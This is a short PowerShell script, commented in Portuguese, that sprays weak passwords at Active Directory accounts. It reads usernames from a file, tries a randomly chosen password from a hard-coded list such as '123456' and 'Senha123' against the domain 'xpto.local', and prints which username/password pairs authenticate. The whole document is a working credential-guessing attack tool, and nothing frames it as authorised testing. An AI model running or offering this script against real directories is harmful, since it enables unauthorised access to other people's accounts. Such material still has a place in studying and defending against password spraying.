$file = "C:\users.txt"
$passwords = @("Kento123!", "Qwerty@123..", "Senha123", "123456", "MinhaSenha123")
# $password = "Kento123!"

$users = Get-Content $file

foreach ($user in $users) {
    $password = $passwords | Get-Random
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($user + "@xpto.local"), $securePassword

    try {
        $adUser = Get-ADUser -Identity $user -Credential $credential -ErrorAction Stop
        Write-Host "Autenticação bem-sucedida para $($adUser.SamAccountName) com a senha: $password." -ForegroundColor Green

        # Descomentar as duas linhas abaixo e comentar as duas linhas acima, se você quiser apenas validar login e senha.
        # As linhas abaixo mostram informações do usuário como o SSID, por exemplo... 

        # Get-ADUser -Identity $user -Credential $credential -ErrorAction Stop
        # Write-Host "Autenticação bem-sucedida para $user com a senha: $password" -ForegroundColor Green
        
    }
    catch {
        Write-Host "Autenticação falhou para $user com a senha: $password." -ForegroundColor Red # Erro: $_" -ForegroundColor Red
    }
}
